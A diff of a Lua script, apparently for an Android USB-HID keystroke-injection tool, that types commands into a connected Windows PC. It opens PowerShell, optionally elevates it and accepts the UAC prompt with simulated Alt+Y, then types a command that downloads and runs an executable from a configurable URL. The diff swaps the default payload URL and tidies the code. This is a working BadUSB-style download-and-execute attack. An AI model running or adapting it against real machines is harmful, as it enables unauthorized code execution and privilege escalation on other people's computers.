@@ -6,24 +6,20 @@
 --- directly translated from the Java version in previous builds
 ---
 
-local file = ask("File to download?", "http://www.greyhathacker.net/tools/messbox.exe")
-local runAs = should("Task UAC", "Launch exec. as admin?");
+local file = ask("File to download?", "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe")
+local runAs = should("Task UAC", "Launch exe as admin?");
 
 while not cancelled() do
-    progress("IDLE")
+    progress("idle")
 
     -- poll until /dev/hidg0 is writable
-    while not cancelled() and test() ~= 0 do
-        delay(1000)
-    end
-    if cancelled() then
-        break
-    end
+    while not cancelled() and not test() do delay(1000) end
+    if cancelled() then break end
 
-    progress("RUNNING")
+    progress("running")
     delay(1000)
 
-    log("opening powershell, runAs=" .. runAs)
+    log("opening powershell, runAs=" .. tostring(runAs))
     if runAs then
         -- when running elevated prompt sometimes it pops in background, so we need
         -- to go to the desktop
@@ -32,7 +28,7 @@ while not cancelled() do
         press_keys(kb.LSUPER, kb.R)
         delay(2000)
         send_string("powershell Start-Process powershell -Verb runAs\n")
-        delay(2000)
+        delay(3000)
         press_keys(kb.LALT, kb.Y)
         delay(2000)
     else
@@ -41,7 +37,7 @@ while not cancelled() do
         send_string("powershell\n")
         delay(2000)
     end
-    
+
     log("download + execute code")
 
     send_string(
@@ -53,8 +49,8 @@ while not cancelled() do
     "exit;\n"
     )
 
-    progress("DONE")
-    while not cancelled() and test() == 0 do
+    progress("done")
+    while not cancelled() and test() do
         delay(1000)
     end
     log("disconnected")
